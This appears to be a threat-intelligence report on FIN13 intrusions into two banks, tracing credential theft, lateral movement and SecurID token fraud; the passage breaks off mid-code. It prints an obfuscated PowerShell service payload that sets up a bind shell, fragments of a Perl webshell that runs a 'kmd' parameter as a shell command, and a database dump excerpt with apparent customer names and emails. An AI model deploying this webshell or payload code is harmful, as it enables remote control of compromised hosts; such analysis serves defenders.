64510|fed35b114e24bf4a88c8b152c02faabb|\n|s0b.j|June/22/2021 22:33:44|Jar that queries db using config data (str-*.txt files)|4bed9c8d06a3ba7215c49f139ca0dd16|\n|str-isis.txt|June/22/2021 22:38:55|jdbc connection / credential info|93acad22e4f91dbc9581377fd9d996e4|\n|jtds-1.2.1.jar|June/23/2021 21:24:56|likely jdbc driver|bc9a0f8026c176ab8afb1b330ef4f781|\n|str-bio.txt|June/29/2021 18:22:44|jdbc connection / credential info|17eb9c943d686a7d7c23266d9cbb3900|\n\n\n-----\n\nFigure 19: Attack Stage 3 – attacker hunting for credentials\n\nIn addition, the attacker installed the Java packet capture tool (RawCap) to sniff credentials passed by the IAM service to\nthe DMZ servers, intercepting additional domain and local passwords. Unfortunately, the RawCap output files were removed\nsoon after their creation by the attacker. At the time of our investigation, the RawCap tool was already removed by the\nactor, but we successfully traced and recovered it by reviewing the machine unallocated space.\n\n**File Name Recovered1** **MD5** **Notes**\n\n./recup_dir.15/f3624376.exe 83af340778e7c353b9a2d2a788c3a13a PKZIP\n\n./recup_dir.12/f3552960_RawCap_exe 0d7a08e7f58bfe020c59d739911ee519 RawCap.exe v0.1.5.0\n\nFigure 20: Recovered files from Oracle IAM server lv_wls volume\n\nFigure 21: Attack Stage 3 – attacker moves laterally\n\n1 The recovery tool used assigns random file names to the files.\n\n|File Name Recovered1|MD5|Notes|\n|---|---|---|\n|./recup_dir.15/f3624376.exe|83af340778e7c353b9a2d2a788c3a13a|PKZIP|\n|./recup_dir.12/f3552960_RawCap_exe|0d7a08e7f58bfe020c59d739911ee519|RawCap.exe v0.1.5.0|\n\n\n-----\n\nAt this stage of the attack, the actor targeted the domain controllers attempting to expand the control to the rest of the network.\nBackweb was an internal web portal including domain accounts. The attacker logged on, copied procdump to the system (pr64.zip)\nand adopted the traditional Kerberoasting technique to collect the ticket from system memory, and crack it offline.\n\nThe actor accessed the system on August 12, 2021 using the customasp local user account.\n\nFigure 22: Attack Stage 3 – attacker prepares to move to core networks\n\nAt 18:05:16 UTC a service was created and initialized with an obfuscated PowerShell payload.\n\nThe SID associated with the service creation was related to customasp account according to Windows Security event logs.\n\n**Date (UTC)** **Event ID** **Event Type** **SID** **Event Date**\n\n{“EventData”:{“Data”:[{“@Name”:”ServiceName”, ”#text”:\n”rmmBkWziNoJNCfjN”},{“@Name”: ”ImagePath”,”#text”:\n”%COMSPEC% /b /c start /b /min powershell.exe -nop -w\nhidden -noni -c \\”if([IntPtr]::Size -eq 4) {$b=’powershell.exe’}\nelse{$b=$env:windir+’\\\\syswow64\\\\WindowsPowerShell\\\n\nS-1-5-21-1450242729 \\v1.0\\\\powershell.exe’};$s=New-Object System.Diagnostics.\n\nAug/12/2021 Service\n7045 -3071772558- ProcessStartInfo;$s. FileName=$b;$s.Arguments=’-noni -nop\n18:05:16 Control Manager\n\n3792214000 -1030 -w hidden -c $wgx=((‘’’’+’’{2}nab’’+’‘leSc’’+’’{3}i{1}’’+’’tBloc{0}\n\nLogg’’+’’ing’’)-f’’k’’,’’p’’,‘’E’’,’’r’’);If($PSVersion Table. PSVersion.\nMajor -ge 3){ $qufcX=[Collections.Generic.Dictionary[string,\nSystem. Object]]::new();[Truncated]ServiceType”,”#text”\n:”user mode service”}, {“@Name”:“StartType”,”#text”:”demand\nstart”}, {“@Name”: “AccountName”,”#text”:”LocalSystem”}]}}\n\n{“EventData”:{“Data”:”Alias, Started, \\tProviderName=Alias\n\\n\\tNewProviderState=Started \\n\\n\\tSequenceNumber=1\n\\n\\n\\tHostName=ConsoleHost\\n \\tHostVersion=4.0 \\n\\t\nHostId=2e63fcea-340e-4389-971b-74fba6c4fce8\\n \\tHost\nApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]:\n:Size -eq 4){$b=’powershell.exe’} else{$b=$env:windir+’\\\\ sys\nwow64\\\\WindowsPowerShell\\ \\v1.0\\\\powershell.exe’};$s=\n\nAug/12/2021 New-Object System.Diagnostics.ProcessStartInfo;$s.FileName\n600 PowerShell\n18:05:21 =$b; $s.Arguments=’ -noni -nop -w hidden -c $wgx=((‘’’’+’’{2}\n\nnab’’ +’’leSc’’+’’{3} i{1}’’+’’tBloc{0}Logg’’+’’ing’’)-f’’k’’,’’p’’,’’E’’,’’r’’);\nIf($PSVersionTable.PSVersion.Major -ge 3) { $qufcX=\n\n[Collections.Generic.Dictionary[string,System.Object]]::new();\n$pD=((‘’Scri {0’’+’’}‘’+’’tB{2}ock’’+’’{1}og’’+’’ging’’)-f’’p’’,’’L’’,’’l’’);\n$jQol=[Ref].Assembly.GetType(((‘’’’+’’{6}{‘’+’’2}{9}tem.{3} a’’+’’na\n{‘’+’’1’’+’’}‘’+’’em’’+’’en’’+’’t.{7}{5}’’+’’t’’+’’{‘’+’’8}’’+’’mati{8’’+’’}\nn.’’+’’{7}’’+’’m{9’ [Truncated]\n\nFigure 23: Obfuscated PowerShell service\n\n|Date (UTC)|Event ID|Event Type|SID|Event Date|\n|---|---|---|---|---|\n|Aug/12/2021 18:05:16|7045|Service Control Manager|S-1-5-21-1450242729 -3071772558- 3792214000 -1030|{“EventData”:{“Data”:[{“@Name”:”ServiceName”, ”#text”: ”rmmBkWziNoJNCfjN”},{“@Name”: ”ImagePath”,”#text”: ”%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c \\”if([IntPtr]::Size -eq 4) {$b=’powershell.exe’} else{$b=$env:windir+’\\\\syswow64\\\\WindowsPowerShell\\ \\v1.0\\\\powershell.exe’};$s=New-Object System.Diagnostics. ProcessStartInfo;$s. FileName=$b;$s.Arguments=’-noni -nop -w hidden -c $wgx=((‘’’’+’’{2}nab’’+’‘leSc’’+’’{3}i{1}’’+’’tBloc{0} Logg’’+’’ing’’)-f’’k’’,’’p’’,‘’E’’,’’r’’);If($PSVersion Table. PSVersion. Major -ge 3){ $qufcX=[Collections.Generic.Dictionary[string, System. Object]]::new();[Truncated]ServiceType”,”#text” :”user mode service”} , {“@Name”:“StartType”,”#text”:”demand start”}, {“@Name”: “AccountName”,”#text”:”LocalSystem”}]}}|\n|Aug/12/2021 18:05:21|600|PowerShell||{“EventData”:{“Data”:”Alias, Started, \\tProviderName=Alias \\n\\tNewProviderState=Started \\n\\n\\tSequenceNumber=1 \\n\\n\\tHostName=ConsoleHost\\n \\tHostVersion=4.0 \\n\\t HostId=2e63fcea-340e-4389-971b-74fba6c4fce8\\n \\tHost Application=powershell.exe -nop -w hidden -noni -c if([IntPtr]: :Size -eq 4){$b=’powershell.exe’} else{$b=$env:windir+’\\\\ sys wow64\\\\WindowsPowerShell\\ \\v1.0\\\\powershell.exe’};$s= New-Object System.Diagnostics.ProcessStartInfo;$s.FileName =$b; $s.Arguments=’ -noni -nop -w hidden -c $wgx=((‘’’’+’’{2} nab’’ +’’leSc’’+’’{3} i{1}’’+’’tBloc{0}Logg’’+’’ing’’)-f’’k’’,’’p’’,’’E’’,’’r’’); If($PSVersionTable.PSVersion.Major -ge 3) { $qufcX= [Collections.Generic.Dictionary[string,System.Object]]::new(); $pD=((‘’Scri {0’’+’’}‘’+’’tB{2}ock’’+’’{1}og’’+’’ging’’)-f’’p’’,’’L’’,’’l’’); $jQol=[Ref].Assembly.GetType(((‘’’’+’’{6}{‘’+’’2}{9}tem.{3} a’’+’’na {‘’+’’1’’+’’}‘’+’’em’’+’’en’’+’’t.{7}{5}’’+’’t’’+’’{‘’+’’8}’’+’’mati{8’’+’’} n.’’+’’{7}’’+’’m{9’ [Truncated]|\n\n\n-----\n\nThis decoded payload results in a similar PowerShell HTTP Bindshell that listens on port 65512 as seen in the next figure.\n\nFigure 24: Decoded PowerShell payload\n\nFrom this point, going forward, the actor organized his attack around Backweb server and accessed it using different\nexternal IP addresses, like: 179.6.92.161. Additionally, the threat actor left several files in the “Windows\\Temp”\ndirectory such as the Java scanner and scanned the internal subnets looking for additional servers. The activity went\nunnoticed because the attacker executed the scanning in different steps, avoiding flooding the network. During the scans\nhe identified a cluster of RSA SecurID servers and attempted to access them by leveraging on service accounts previously\nstolen but failed.\n\nOur team analyzed the contents of the wtmp and btmp log files, where the SecurID system store SSH logons. The /var/log/\nbtmp file showed significant failed SSH connection attempts that confirmed dictionary-based access attempts executed on\nAugust 14, 2021.\n\nAn excerpt of the logs is reported below:\n\n\nadmin ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nadmin ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nP9IA5zN ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nadmin ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nadmin ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nadmin ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nadmin ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nshelladm ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nadmin ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nshelladm ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nadmin ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nadmin ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nftp ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nSEadmin ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nIOMonitor ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nmonitor ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nill2021 ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nadmin1 ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nadmin2 ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nadminZ ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\nn3ssus ssh:notty 10.128.60.174 Sun Aug 14 02:04 - 02:04 (00:00)\n\n\nFigure 25: Excerpt of log activity\n\n\n-----\n\nNotably, the accounts attempted were existing users and that confirmed the earliest credential harvesting executed by the\nattacker. However, failure to access the SecurID server forced the attacker to adopt to a different approach. The attacker\nencircled the RSA servers by enumerating databases in the same network segment. He scanned for MS-SQL servers from the\nsame host where he attempted ssh logons and brought in the following files:\n\n - s0b.j\n\n - str-isis.txt\n\n - jtds-1.2.1.jar\n\n - str-bio.txt\n\ns0b.j accepts as a parameter Base64 encoded SQL queries and uses a configuration file (srt*.txt) that contains the connection\nstring and credentials of the target database server. With this trick, the attacker accessed a number of databases until he\nsuccessfully landed on a database storing the SecurID token serials together with the corresponding end-user account\n(without the password). They then dumped the database, moved it to the Backweb server and exfiltrated it.\n\nFigure 26: Attack Stage 3 – attacker harvests data to prepare the fraud\n\n\n-----\n\nTerminal service logs show that the actor accessed this system via RDP at this time using the sqlservice account. Several\nadditional date/times and sources were associated with logons with this account as well as sqlinstall.\n\n**Date** **Time (UTC)** **Event** **Computer** **User** **Source**\n\n8/21/2021 1:20:26 PM 21 backweb.dmz.<redacted> <Redacted>\\sqlservice 10.159.83.8\n\n8/21/2021 1:31:11 PM 21 backweb.dmz.<redacted> <Redacted>\\sqlservice 10.159.83.8\n\n8/22/2021 3:00:37 AM 21 backweb.dmz.<redacted> <Redacted>\\sqlservice 10.159.83.8\n\n8/22/2021 8:33:57 AM 21 backweb.dmz.<redacted> <Redacted>\\sqlservice 10.159.83.8\n\n8/23/2021 1:49:05 PM 21 backweb.dmz.<redacted> <Redacted>\\sqlservice 10.159.83.8\n\n8/23/2021 6:18:51 PM 21 backweb.dmz.<redacted> <Redacted>\\sqlinstall 10.159.83.8\n\n8/23/2021 8:21:10 AM 21 backweb.dmz.<redacted> <Redacted>\\sqlinstall 10.159.83.8\n\n8/28/2021 5:44:48 PM 21 backweb.dmz.<redacted> <Redacted>\\sqlservice 10.159.83.8\n\nFigure 27: Terminal service logs for SQL Server\n\nThe completion of this activity allowed the attacker to harvest tokens serials from the database and to collect daily\ntransactions, in clear text, stored inside a service account folder, where the storage procedure was scripted, as illustrated in the\nfollowing figure:\n\nFigure 28: Enrollment token records\n\nThe successful harvesting of the tokens allowed the attacker to execute frauds against bank users by activating a token\nrecovery procedure and subsequently log on and transfer money from the online banking system.\n\n|Date|Time (UTC)|Event|Computer|User|Source|\n|---|---|---|---|---|---|\n|8/21/2021|1:20:26 PM|21|backweb.dmz.<redacted>|<Redacted>\\sqlservice|10.159.83.8|\n|8/21/2021|1:31:11 PM|21|backweb.dmz.<redacted>|<Redacted>\\sqlservice|10.159.83.8|\n|8/22/2021|3:00:37 AM|21|backweb.dmz.<redacted>|<Redacted>\\sqlservice|10.159.83.8|\n|8/22/2021|8:33:57 AM|21|backweb.dmz.<redacted>|<Redacted>\\sqlservice|10.159.83.8|\n|8/23/2021|1:49:05 PM|21|backweb.dmz.<redacted>|<Redacted>\\sqlservice|10.159.83.8|\n|8/23/2021|6:18:51 PM|21|backweb.dmz.<redacted>|<Redacted>\\sqlinstall|10.159.83.8|\n|8/23/2021|8:21:10 AM|21|backweb.dmz.<redacted>|<Redacted>\\sqlinstall|10.159.83.8|\n|8/28/2021|5:44:48 PM|21|backweb.dmz.<redacted>|<Redacted>\\sqlservice|10.159.83.8|\n\n\n-----\n\n### The Attack Outcome: Online Banking Fraud\n\nThe attacker executed the fraud in three weeks between September and October 2021 impacting hundreds of accounts for a\nsignificant amount of money. We started investigating the case at the end of September 2021 soon after the bank realized a fraud,\nsomewhat linked with RSA SecurID was occurring.\n\nThe investigation lasted for about six weeks and determined the evidence we reported.\n\n#### Second Case\n\nDuring the month of January 2022, a customer in Peru reported a second case. This time the actor leveraged on Log4j\nvulnerability to open a breach head on the DMZ and immediately deployed tools to consolidate his position. The case\nwent on fire when the end-users started complaining to the bank about their money losses while the bank anti-fraud\nprotection system was not reporting any remarkable record of fraud attempted. They asked support to review their 2-factor\nauthentication system and again, we found traces of FIN13 activity. Unfortunately, we were not having our Netwitness\nNetwork platform available to perform network forensics and we were limited to investigate with Logs and our Endpoint\nsolution, deployed when we started the analysis. The actor was able to exploit a vulnerable exposed and unpatched system on\nthe border: AKATWEB, a proxy, implanting a JSP webshell. Then he moved laterally to a DMZ segment hosting a SharePoint\nserver where he landed probably using the CVE-2019-0604 exploit, imported procdump (pr64.exe) and successfully dumped\nthe SharePoint cached credentials.\n\nFigure 29: Second case, attack initial phase\n\nWe recovered traces of this activity from the SharePoint server MFT:\n\nFigure 30: Evidence of dumped LSASS.exe process executed on December 11, 2021\n\n\n-----\n\nWith the SharePoint credential hashes collected, the actor executed a scan on the REMWK DMZ.\n\nHe found additional servers, moved laterally leveraging on credentials extracted and cracked from the SharePoint and\nexecuted another lsass.exe dump by importing procdump (pr64.exe):\n\nFigure 31: Evidence of dumped LSASS.exe process executed on December 19, 2021\n\nThis second dump contained administrative domain credentials for SQL Servers and a service account related to a\ncluster (MULTICLDBSIDE).\n\nFigure 32: Attack second phase – attacker extends the compromise\n\n\n-----\n\nThe following accounts were identified within the LSASS dump that contained NT hashes:\n\n**Username** **Domain** **Logon Server** **logon_time (UTC)** **SID**\n\n2021-12-17 S-1-5-21-1468044382-2625088049ugssdbmultidedp02 <REDACTED> AD01\nT03:08:11.098895 3232167870-282957\n\n2021-12-17 S-1-5-21-1468044382-2625088049ugsop_sql1 <REDACTED> AD01\nT02:25:44.207420 3232167870-211229\n\n2021-12-17 S-1-5-21-1468044382-2625088049ugssdbmultidedp02 <REDACTED> AD01\nT03:08:04.754535 3232167870-282957\n\n2021-12-17 S-1-5-21-1468044382-2625088049ugssdbmultidedp02 <REDACTED> AD01\nT03:07:52.800255 3232167870-282957\n\n2021-06-12 S-1-5-21-1468044382-2625088049SQLMULTIVBDLIST$ <REDACTED> AD02\nT02:37:47.721802 3232167870-282950\n\n2021-12-19 S-1-5-21-1468044382-2625088049SQLMULTIVBDCLS$ <REDACTED> AD02\nT13:02:02.892710 3232167870-282941\n\n2021-06-12 S-1-5-21-1468044382-2625088049SQLMULTIVBDCLS$ <REDACTED> AD02\nT02:49:43.174184 3232167870-282941\n\n2021-06-26 S-1-5-21-1468044382-2625088049SQLMULTIVBDCLS$ <REDACTED> AD02\nT04:51:38.286247 3232167870-282941\n\n2021-12-19 S-1-5-21-1468044382-2625088049acunamar05 <REDACTED> AD03\nT03:26:39.777001 3232167870-292576\n\n2021-06-1 S-1-5-21-1468044382-2625088049ugssdbmultidedp02 <REDACTED> AD03\n2T02:37:34.284285 3232167870-282957\n\n2021-06-12 S-1-5-21-1468044382-2625088049ssdbnetworker <REDACTED> AD03\nT02:37:30.893637 3232167870-169090\n\n2021-06-12 S-1-5-21-1468044382-2625088049ssdbnetworker <REDACTED> AD03\nT02:37:33.159270 3232167870-169090\n\n2021-12-19 S-1-5-21-1468044382-2625088049ugssdbmultidedp02 <REDACTED> AD03\nT03:40:38.435740 3232167870-282957\n\n2021-06-12 S-1-5-21-2315371385-3891225496CLIUSR MULTIDDP02 MULTIDDP02\nT02:37:34.096776 4264005094-1025\n\nFigure 33: LSASS dump NT credentials\n\nThere was also an SSP entry associated with the RBMAdmin account although it is unclear if the password from this\nLSASS dump could have been leveraged for further access.\n\n|Username|Domain|Logon Server|logon_time (UTC)|SID|\n|---|---|---|---|---|\n|ugssdbmultidedp02|<REDACTED>|AD01|2021-12-17 T03:08:11.098895|S-1-5-21-1468044382-2625088049- 3232167870-282957|\n|ugsop_sql1|<REDACTED>|AD01|2021-12-17 T02:25:44.207420|S-1-5-21-1468044382-2625088049- 3232167870-211229|\n|ugssdbmultidedp02|<REDACTED>|AD01|2021-12-17 T03:08:04.754535|S-1-5-21-1468044382-2625088049- 3232167870-282957|\n|ugssdbmultidedp02|<REDACTED>|AD01|2021-12-17 T03:07:52.800255|S-1-5-21-1468044382-2625088049- 3232167870-282957|\n|SQLMULTIVBDLIST$|<REDACTED>|AD02|2021-06-12 T02:37:47.721802|S-1-5-21-1468044382-2625088049- 3232167870-282950|\n|SQLMULTIVBDCLS$|<REDACTED>|AD02|2021-12-19 T13:02:02.892710|S-1-5-21-1468044382-2625088049- 3232167870-282941|\n|SQLMULTIVBDCLS$|<REDACTED>|AD02|2021-06-12 T02:49:43.174184|S-1-5-21-1468044382-2625088049- 3232167870-282941|\n|SQLMULTIVBDCLS$|<REDACTED>|AD02|2021-06-26 T04:51:38.286247|S-1-5-21-1468044382-2625088049- 3232167870-282941|\n|acunamar05|<REDACTED>|AD03|2021-12-19 T03:26:39.777001|S-1-5-21-1468044382-2625088049- 3232167870-292576|\n|ugssdbmultidedp02|<REDACTED>|AD03|2021-06-1 2T02:37:34.284285|S-1-5-21-1468044382-2625088049- 3232167870-282957|\n|ssdbnetworker|<REDACTED>|AD03|2021-06-12 T02:37:30.893637|S-1-5-21-1468044382-2625088049- 3232167870-169090|\n|ssdbnetworker|<REDACTED>|AD03|2021-06-12 T02:37:33.159270|S-1-5-21-1468044382-2625088049- 3232167870-169090|\n|ugssdbmultidedp02|<REDACTED>|AD03|2021-12-19 T03:40:38.435740|S-1-5-21-1468044382-2625088049- 3232167870-282957|\n|CLIUSR|MULTIDDP02|MULTIDDP02|2021-06-12 T02:37:34.096776|S-1-5-21-2315371385-3891225496- 4264005094-1025|\n\n\n== SSP [ad0a]==\n\nusername RBMAdmin\n\ndomainname <REDACTED>\n\npassword b’\\xa5X\\x90\\..<REDACTED>..\\x42\\x9e’\n\n\nFigure 34: SSP entry w/ RBMAdmin account\n\nFrom this point, going forward, the attacker was able to leverage on RBMAdmin account to log and query all the databases\nresiding on the REMWK DMZ; we found multiple evidence of database dumps occurred between December 20 and 23, 2021.\n\n\n-----\n\nAn example of the dump content is illustrated below:\n\n\nselect\n\nIdUsuario,IdTipoUsuario,IdEmpresa,NombreUsuario,Nombre,RFC,Email,CONVERT(VARBINARY(MAX),Clave),ClaveSalt,Estatus,CONVERT\n(VARBINARY(MAX),RespuestaSeguridad),idPreguntaSeguridad,BloqueoNoUso,NumeroCliente,IdTipoBloqueo from Per_Usuario where len\n(Clave) = 128\n\n‘IdUsuario’|’IdTipoUsuario’|’IdEmpresa’|’NombreUsuario’|’Nombre’|’RFC’|’Email’|’’|’ClaveSalt’|’Estatus’|’’|’idPreguntaSeguridad’|’BloqueoNoUso’\n|’NumeroCliente’|’IdTipoBloqueo’|‘391542’|’1’|’108478’|’a0110441’|’HACIENDA AGRICOLA LOS ANDES\n\n‘|’HAD1994146D4’|’hacienda.losandes@yachay.pe’|’0x613733364445393243323142433<REDACTED>4439371135’|’’|’9’|’0x3D303D\n<REDACTED>1F3F’|’1’|’0’|’04287016’|’7’|‘211333’|’1’|’108479’|’a0110722’|’EMILIO ESTEBAN ARBI’|’EEA199516D64’|’emilio.esteban@comcast.\nnet‘|’0x363638453938464435463241464543413231423339353037463735374242393041303245<REDACTED>6303135’|’’|’0’|’0x2D3F3F\n<REDACTED>3F53’|’11’|’0’|’06689138’|’NULL’|\n\n\nIn addition, when reviewing the system RBSCLPED01 we found a number of stored jdbc files, connected with the attacker\ntool s0b.j:\n\n\nclass=net.sourceforge.jtds.jdbc.Driver\nconstr=jdbc:jtds:sqlserver://10.130.10.85;DatabaseName=master\nusr= acunamar05\npwd=rbmcls<redacted>\n\n\nclass=net.sourceforge.jtds.jdbc.Driver\nconstr=jdbc:jtds:sqlserver://10.130.10.16;DatabaseName=master\nusr= acunamar05\npwd=rbmcls<redacted>\n\n\nclass=net.sourceforge.jtds.jdbc.Driver\nconstr=jdbc:jtds:sqlserver://10.130.10.30;DatabaseName=master\nusr=acunamar05\npwd=rbmcls<redacted>\n\n\nFigure 35: Examples of DB browser configuration files recovered from RBSCLPED01 server\n\nNotably, we found the configuration files in unallocated space of RBSCLPED01.\n\nQuerying the databases, the attacker was able to collect user details and data but was unable to conduct a fraud with these\ndetails. To complete the cycle, the attacker was looking to harvest end-user’s credentials and targeted the Active Directory\nservers of the online banking infrastructure.\n\nA specific domain controller, part of the internal forest was targeted: the system was a legacy Windows 2012 server: QTCBDC02.\n\n\n-----\n\nFigure 36: Attacker moves against the domain servers\n\nThe triage on the QTCBDC02 domain controller showed signs of malicious activity. The triage process included the\ncollection and analysis of several system components, among which the MFT, amcache, shimcache and system logs.\n\nWe identified two suspicious instances of PsExec (psexesvc.exe).\n\nFigure 37: PSEXESVC service creation\n\nWe identified the presence of a VBS script on the system, created on December 26 2021, which scans system shares and\noutputs the result in the two text files found on the system.\n\n\n-----\n\nFigure 38: VBS script and related artifacts\n\nThe script was partially build around the following WMI script:\n\n[https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs](https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs)\n\nIt also contained a database connection string which includes username and password in Base64 encoding, as\nshown in Figure 39.\n\nFigure 39: Database password in base64 encoding\n\nFurther analysis on the system highlighted additional instances of PsExec (psexesvc.exe):\n\n**SYSVOL\\Windows\\PSEXESVC.EXE  2021-12-26 18:42:43**\n**SYSVOL\\Windows\\System32\\rdpclip.exe  2021-12-26 18:46:38**\n**SYSVOL\\Windows\\System32\\bridgeunattend.exe  2014-11-22 01:46:05**\n**SYSVOL\\Windows\\System32\\dsac.exe  2020-03-07 06:43:49**\n\nFigure 40: ShimCache evidence of PSExec execution\n\nFigure 41: PSEXESVC service creation event\n\nEvidence was also found of PsExec64.exe appearing on the system on 24/12/2021, aligned with attacker timeline.\n\n\n-----\n\nFigure 42: MFT record of psexec64.exe file\n\nFinally, we found the missing piece, PsExec64.exe was referenced in a bat script called CCfix.bat. By analyzing its content, we\ndetermined that this was used to enable RDP in hosts specified in a file called equipos.txt.\n\nFigure 43: CCfix.bat\n\nThe equipos.txt file had four entries in it as shown in the figure below:\n\n\nQTCBDC02\nQTVCTR01\nQTBKSR02\nQTJPGPA1\n\n\nThe finding allowed our team to trace another bat script (CCfixA.bat) where PsExec64.exe was used to perform several tasks.\nIn this script a potential cleartext passwords was found for user usrdskmgt.\n\n\n-----\n\nThe contents of the script are provided in the Figure below:\n\nFigure 44: CCfixA.bat\n\nMore evidence of bat scripts utilizing PsExec64.exe was found on the system.\n\nThe scripts were similar and were used to enable RDP on the hosts specified in the different equipos.txt files.\n\nFigure 45: PsExec64 used to enable RDP\n\nThanks to these activities, the actor compromised the domain controller and a number of accounts allowing him to access\nthe INTSERV AREA systems, where in this case, the SecurID servers were deployed.\n\nWith the INTSRV area now reachable, the attacker tested and finally found a system allowed to directly access internet:\nQTJPGPA1 and implanted a PERL Reverse Shell on it granting direct access to the specific area from a dedicated C2.\n\n\n-----\n\nFigure 46: Attacker activates a PERL Reverse Shell\n\nThe initial service enumeration gave the attacker the evidence of the Hypervisor and the VMware V-Center system and the\nevidence of a SecurID cluster for the mobile banking system.\n\nLeveraging on the accounts previously stolen, the attacker was able to access the V-Center server and to clone one of the\nSecurID servers exporting the clone through QTJPGPA1, the new channel opened for the purpose in chunks.\n\nWith the SecurID clone available and the accounts previously dumped, the attacker began the execution of the fraud\ntargeting the users of a specific online mobile service offered by the bank.\n\nWe went engaged about ten days later, when the attacker already harvested a significant amount of money from about\n1,350 bank accounts.\n\nUnfortunately, during this activity the anti-fraud systems usually reporting malicious impersonation attempts and other\nsimilar actions remained silent. Reviewing the report of the system against known fraudulent transactions, it was clear the\nattacker studied the way to fool it by leveraging on adapted User-Agents (linked to mobile devices such as Android and IOS\nsmartphones), HTTP referrals and IP addresses linked with local dial-up providers.\n\nThe sum of these items generated very low scores for the fraudulent transactions.\n\n\n-----\n\n### Conclusion\n\nFIN13 remains an adversarial threat actor group of high interest to the NetWitness Incident Response and FirstWatch Threat\nResearch and Intelligence teams. This threat actor demonstrated noteworthy levels of expertise in coding, red-teaming/\npenetration testing, in addition to other forms of demonstratable adversarial trade craft in the two cases that we specifically\nfocused on during our course of collections, research and analysis, and writing. The determination these actors showed in\nconducting operational movement in post-exploitation scenarios (e.g., target selection, credential acquisition in addition to\nmisuse/abuse, and lateral movement) proved to be in alignment with what we have collectively observed in the wild, wherein\nseasoned, veteran actors were at work advancing cyber criminal and cyber espionage operations and campaigns in pursuit of\ngoal attainment.\n\nPerhaps one of the most intriguing aspects of the behaviors observed with FIN13 is their willingness to target hard targets such as\nthe financial institutions cited in the cases that we investigated and analyzed. In these cases, FIN13 worked toward the systemic\nbreach of these financial institutions in order to patiently advance as they moved laterally toward the core of the targets network,\nwhere the organization’s multi-factor authentication (MFA) systems were housed in order to steal both tokens and seeds. In doing\nso, they were able to pursue the execution of a rather bold fraud operation leveraging mobile network IP addresses associated\nwith the country of origin of the victims in question order to deceive the anti-fraud capabilities and systems of the financial\ninstitutions in question.\n\nThe NetWitness Incident Response and FirstWatch Threat Research and Intelligence teams will continue to monitor activity\nrelated to FIN13 within both their principal geography and as they expand. We will continue to monitor for movement into\nadjacent industry verticals and expansion that sees the FIN13 group mature and grow over time. We believe that through a deep\nand proper understanding of this adversarial threat actor group, early detection and response—against FIN 13’s patterns of\nbehavior, sophistication, tools, techniques, and practices (TTPs)—is achievable.\n\n### Appendix A: attacker tools\n\n PowerShell HTTP Bind shell (BlueAgave)\n\nBLUEAGAVE is a PowerShell HTTP webshell that utilizes the HttpListener .NET class to establish a local HTTP server on high\nephemeral ports (65510-65512). The backdoor listens for incoming HTTP requests to the root URI / on the established port,\nparses the HTTP request, and executes the URL encoded data stored within the ‘kmd’ variable of the request via the\nWindows Command Prompt (cmd.exe). The output of this command is then sent back to the operator in the body of the HTTP\nresponse.\n\n### Perl Bind Shell (BlueAgave)\n\nIn the course of the investigation, RSA IR found a file named 65.txt, a Perl HTTP webshell that listens on TCP port: 65510.\nUpon analysis the malicious code was linked to BlueAgave webshell despite his original language was Perl. The script, upon\nexecution fork and then exits out back to the command line.\n\nHowever, the socket stays open, and the Perl code will process the request. Once active the webshell behavior is remarkably\nclose to the BlueAgave PowerShell code.\n\nIt runs under “[cpuset]” process and shows up as “[cpuset]” when looking at the process list.\n\nuse strict;\nuse Socket;\nuse IO::Socket;\nmy $pid = fork();\nexit if $pid;\n$0 = ‘[cpuset]’;\n\nFigure 47: 65.txt decoded contents\n\n\n-----\n\nThe following snippet shows the parse_form subroutine.\n\nThis is responsible for parsing out the commands in the variable “$method{CONTENT}” which is passed to parse_form\nlater in the code.\n\nThe data comes in as form data (i.e. {key=value}&{key=value}).\n\nHighlighted in green in Figure 8 shows the conversion from %{hex value} to ASCII for the $val for any data sent to in that form.\n\nHighlighted in yellow shows that if the $key contains “kmd”, it will run the contents of $val in the line highlighted in red.\n\nThe output is returned to the main program to be printed out.\n\n\nsub parse_form {\n\nmy $data = $_[0];\nmy %data;\nforeach (split /&/, $data) {\n\nmy ($key, $val) = split /=/;\n$val = ~ s/\\+/ /g;\n$val =~ s/%(..)/chr(hex($1))/eg;\n$data {\n$key\n} = $val;\nif ($key == “kmd”) {\nmy @code = `$val 2 > /dev/stdout`;\n$data {\n\n“output”\n} = join(‘’, @code);\n}\n}\nreturn %data;\n}\n\n\nFigure 48: Additional 65.txt decoded contents\n\nFigure 49 shows the rest of the Perl script.\n\nHighlighted in yellow it shows that 65510 was setup as the listening port.\n\nThe rest of the script parses the web data sent to it by the client. Highlighted in green shows that in order to process the data\nreceived, there has to be a HTTP POST header. Then the contents of “$request {CONTENT}” are sent to the parse_form\nsubroutine. Highlighted in red it will print out the results from the “kmd” given to the server to execute.\n\n\n-----\n\nmy $port = 65510;\nmy $server = new IO::Socket::INET(Proto => ‘tcp’, LocalPort => $port, Listen\n=> SOMAXCONN, Reuse => 1);\nwhile (my 